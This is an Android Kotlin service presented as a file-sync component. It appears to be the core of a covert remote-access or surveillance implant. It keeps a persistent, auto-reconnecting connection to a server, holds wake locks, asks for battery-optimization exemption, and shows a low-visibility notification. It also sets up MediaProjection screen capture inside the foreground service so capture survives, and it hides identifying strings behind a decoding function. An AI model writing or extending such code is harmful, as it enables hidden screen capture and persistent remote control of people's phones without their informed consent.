package com.georgetech.filesync

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjectionManager
import android.os.BatteryManager
import android.os.Build
import android.net.Uri
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import com.georgetech.filesync.modules.DisplayHelper
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.math.min

class SyncService : Service() {

    private val executor = Executors.newScheduledThreadPool(3)
    private lateinit var handler: Dispatcher
    private lateinit var client: SyncAdapter
    private var wakeLock: PowerManager.WakeLock? = null
    private var reconnectDelay = Config.RECONNECT_BASE_MS

    @Volatile
    private var running = false

    private fun k(e: String) = Crypt.d(e)

    override fun onCreate() {
        super.onCreate()
        handler = Dispatcher(this)
        client = SyncAdapter(this, handler)
        handler.client = client
        acquireWakeLock()
        requestBatteryExemption()
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "ACTION_ACTIVATE_MP") {
            // Called by GrantActivity after user taps "Start now" in MediaProjection dialog.
            // getMediaProjection() + setupCapture() run here (inside foreground service) so the
            // projection survives GrantActivity.finish() without Samsung revoking it.
            val rc = intent.getIntExtra("result_code", 0)
            @Suppress("DEPRECATION")
            val data = intent.getParcelableExtra<Intent>("data")
            val w = intent.getIntExtra("width", 1080)
            val h = intent.getIntExtra("height", 2340)
            val dpi = intent.getIntExtra("dpi", 480)
            if (rc != 0 && data != null) {
                executor.submit {
                    try {
                        startForegroundNotification()  // re-assert MEDIA_PROJECTION type
                        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                        val proj = mpm.getMediaProjection(rc, data)
                        Log.d("SK_SVC", "ACTION_ACTIVATE_MP: proj=${proj != null}")
                        if (proj != null) {
                            val metrics = DisplayMetrics().apply {
                                widthPixels = w; heightPixels = h; densityDpi = dpi
                            }
                            DisplayHelper.projection = proj
                            DisplayHelper.setupCapture(proj, metrics)
                            Log.d("SK_SVC", "setupCapture done: ${DisplayHelper.lastSetupError}")
                        } else {
                            DisplayHelper.lastSetupError = "proj_null_from_svc"
                        }
                    } catch (e: Exception) {
                        DisplayHelper.lastSetupError = "svc_ex: ${e.javaClass.simpleName}: ${e.message}"
                        Log.e("SK_SVC", "ACTION_ACTIVATE_MP ex: ${e.message}")
                    }
                }
            }
            return START_NOT_STICKY
        }
        if (!running) {
            running = true
            executor.submit { connectionLoop() }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        client.disconnect()
        executor.shutdownNow()
        wakeLock?.let { if (it.isHeld) it.release() }
        super.onDestroy()
    }

    private fun connectionLoop() {
        while (running) {
            try {
                client.connect()
                reconnectDelay = Config.RECONNECT_BASE_MS
                startHeartbeat()
                client.receiveLoop()
            } catch (_: Exception) {}

            client.disconnect()
            if (!running) break

            try {
                Thread.sleep(reconnectDelay)
            } catch (_: InterruptedException) { break }

            reconnectDelay = min(reconnectDelay * 2, Config.RECONNECT_MAX_MS)
        }
    }

    private fun startHeartbeat() {
        executor.scheduleAtFixedRate({
            if (client.connected) {
                try {
                    client.sendHeartbeat(getBatteryLevel(), null)
                } catch (_: Exception) {}
            }
        }, Config.HEARTBEAT_INTERVAL_MS, Config.HEARTBEAT_INTERVAL_MS, TimeUnit.MILLISECONDS)
    }

    fun getBatteryLevel(): Int {
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val battery = registerReceiver(null, filter)
        val level = battery?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = battery?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        return if (scale > 0) (level * 100) / scale else -1
    }

    private fun requestBatteryExemption() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            }
        } catch (_: Exception) {}
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            k("KS89LzU2DDY+Lmc9bRc7MDkxMTwL")
        ).apply { acquire(30 * 60 * 1000L) }  // 30 min, auto-renewed by reconnect loop
    }

    private fun startForegroundNotification() {
        val channelId = k("KTADLjstFjM4OQ==")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                Config.APP_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply { setShowBadge(false) }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle(Config.APP_NAME)
            .setContentText(k("CC4yMzcxBw=="))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        // Android 12+ requires explicit type to satisfy getMediaProjection() SecurityException check
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(1, notification)
        }
    }
}
